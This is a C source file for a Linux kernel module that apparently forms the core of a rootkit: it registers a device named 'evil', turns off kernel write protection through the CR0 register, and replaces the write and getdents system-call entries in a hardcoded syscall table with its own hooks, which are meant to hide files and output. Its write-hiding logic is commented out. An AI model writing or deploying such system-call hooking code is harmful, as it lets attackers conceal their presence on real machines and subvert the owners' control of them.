#include"../headers/all.h"


MODULE_LICENSE("GPL");

static unsigned long 
*sys_call_table = (unsigned long *) 0xffffffff81801300;

asmlinkage int 
(*original_write)(unsigned int fd, const char *buf, size_t nbyte);


asmlinkage int
(*original_getdents)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

/*
exterm symbols here
*/



extern char 
rk_buf[BUFLEN];

extern int 
is_open;

	

extern struct miscdevice 
evil;



extern asmlinkage int
my_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);





/*By Chen
 *
 * in buf special types: 4B + 8B_prifix+ strlen(TARGET)+4B_surfix + 2B(white space) 
 *
 *
 *
 * */
asmlinkage int 
my_write(unsigned int fd, const char *buf, size_t nbyte){	
	//char *index1, *index2;
	//char *hide_str = "test";
	//bool is_special = 1;
//	char *str2 = "flush.sh";
	if(fd == 1){
		
//		if(index1 = strstr(buf, hide_str)){
//			return -1;
//			index2 = strstr(buf, str2);
/*
			int offset = is_special?strlen(hide_str) +4+2:strlen(hide_str)+2;
			printk("target len %d, test ahead : %s\n ", strlen(hide_str),  index1-8);
			if(is_special)
				memcpy(index1-8, index1+offset, strlen(index1+offset));
			else
				memcpy(index1, index1+offset, strlen(index1+offset));
				*/
//		}
	}	
	return (*original_write)(fd, buf, nbyte);
}







static int 
init_mod(void){
	
	
	
	misc_register(&evil);
	//Changing control bit to allow write	
	write_cr0 (read_cr0 () & (~ 0x10000));
	original_write = (void *)sys_call_table[__NR_write];
	original_getdents = (void *)sys_call_table[__NR_getdents];
	sys_call_table[__NR_write] = (unsigned long)my_write;
	sys_call_table[__NR_getdents] = (unsigned long)my_getdents;
	//Changing control bit back
	write_cr0 (read_cr0 () | 0x10000);
	return 0;
}

static void 
exit_mod(void){

	 misc_deregister(&evil);
	//Cleanup
	write_cr0 (read_cr0 () & (~ 0x10000));
	sys_call_table[__NR_write] =(unsigned long) original_write;
	sys_call_table[__NR_getdents] =(unsigned long) original_getdents;
	write_cr0 (read_cr0 () | 0x10000);



	return;
}

module_init(init_mod);
module_exit(exit_mod);





	




